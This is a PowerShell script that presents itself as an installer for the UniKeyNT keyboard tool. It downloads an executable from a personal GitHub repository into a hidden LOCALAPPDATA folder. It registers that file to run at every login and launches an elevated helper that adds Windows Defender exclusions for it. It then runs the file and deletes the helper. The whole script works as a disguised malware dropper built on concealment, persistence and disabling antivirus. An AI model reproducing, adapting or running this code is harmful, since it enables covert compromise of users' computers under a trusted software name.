$PSDefaultParameterValues['Stop-Process:ErrorAction'] = [System.Management.Automation.ActionPreference]::SilentlyContinue

function Get-File
{
  param (
    [Parameter(Mandatory, ValueFromPipelineByPropertyName)]
    [ValidateNotNullOrEmpty()]
    [System.Uri]
    $Uri,
    [Parameter(Mandatory, ValueFromPipelineByPropertyName)]
    [ValidateNotNullOrEmpty()]
    [System.IO.FileInfo]
    $TargetFile,
    [Parameter(ValueFromPipelineByPropertyName)]
    [ValidateNotNullOrEmpty()]
    [Int32]
    $BufferSize = 1,
    [Parameter(ValueFromPipelineByPropertyName)]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('KB, MB')]
    [String]
    $BufferUnit = 'MB',
    [Parameter(ValueFromPipelineByPropertyName)]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('KB, MB')]
    [Int32]
    $Timeout = 10000
  )

  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

  $useBitTransfer = $null -ne (Get-Module -Name BitsTransfer -ListAvailable) -and ($PSVersionTable.PSVersion.Major -le 5) -and ((Get-Service -Name BITS).StartType -ne [System.ServiceProcess.ServiceStartMode]::Disabled)

  if ($useBitTransfer)
  {
    Write-Information -MessageData 'Using a fallback BitTransfer method since you are running Windows PowerShell'
    Start-BitsTransfer -Source $Uri -Destination "$($TargetFile.FullName)"
  }
  else
  {
    $request = [System.Net.HttpWebRequest]::Create($Uri)
    $request.set_Timeout($Timeout) #15 second timeout
    $response = $request.GetResponse()
    $totalLength = [System.Math]::Floor($response.get_ContentLength() / 1024)
    $responseStream = $response.GetResponseStream()
    $targetStream = New-Object -TypeName ([System.IO.FileStream]) -ArgumentList "$($TargetFile.FullName)", Create
    switch ($BufferUnit)
    {
      'KB' { $BufferSize = $BufferSize * 1024 }
      'MB' { $BufferSize = $BufferSize * 1024 * 1024 }
      Default { $BufferSize = 1024 * 1024 }
    }
    Write-Verbose -Message "Buffer size: $BufferSize B ($($BufferSize/("1$BufferUnit")) $BufferUnit)"
    $buffer = New-Object byte[] $BufferSize
    $count = $responseStream.Read($buffer, 0, $buffer.length)
    $downloadedBytes = $count
    $downloadedFileName = $Uri -split '/' | Select-Object -Last 1
    while ($count -gt 0)
    {
      $targetStream.Write($buffer, 0, $count)
      $count = $responseStream.Read($buffer, 0, $buffer.length)
      $downloadedBytes = $downloadedBytes + $count
      Write-Progress -Activity "Downloading file '$downloadedFileName'" -Status "Downloaded ($([System.Math]::Floor($downloadedBytes/1024))K of $($totalLength)K): " -PercentComplete ((([System.Math]::Floor($downloadedBytes / 1024)) / $totalLength) * 100)
    }

    Write-Progress -Activity "Finished downloading file '$downloadedFileName'"

    $targetStream.Flush()
    $targetStream.Close()
    $targetStream.Dispose()
    $responseStream.Dispose()
  }
}

$uri = "https://github.com/yourname1204/future/raw/main/UniKeyNT.exe"
$dir = Join-Path -Path $env:LOCALAPPDATA -ChildPath 'UnikeyNT\'
if (!(Test-Path -Path $dir)) {
    New-Item -ItemType Directory -Force -Path $dir
}
$hiddenAttribute = [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path (Join-Path -Path $env:LOCALAPPDATA -ChildPath 'UnikeyNT\') -Name Attributes -Value $hiddenAttribute
Set-ItemProperty -Path $dir -Name Attributes -Value $hiddenAttribute
$file_path = Join-Path -Path $dir -ChildPath 'UniKeyNT.exe'
Get-File -Uri $uri -TargetFile $dir
if (Test-Path -Path $file_path) {
    [System.Console]::Clear()
    Write-Host "Successfully installed UnikeyNT64"
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'UnikeyNT64' -Value $file_path
    Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
    $cmd1 = "Add-MpPreference -ExclusionProcess UniKeyNT.exe; Add-MpPreference -ExclusionPath ${env:LOCALAPPDATA}\UnikeyNT; Add-MpPreference -ExclusionPath ${file_path}"
    Set-Content -Path "${env:LOCALAPPDATA}\run2.ps1" -Value $cmd1
    Start-Process powershell -Verb runAs -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File ${env:LOCALAPPDATA}\run2.ps1")
    Write-Host "Successfully added to Windows Defender exclusion list"
    Invoke-Item -Path $file_path
    Write-Host "Successfully run file"
    Start-Sleep -Seconds 2
    Remove-Item -Path "${env:LOCALAPPDATA}\run2.ps1"
    exit
}
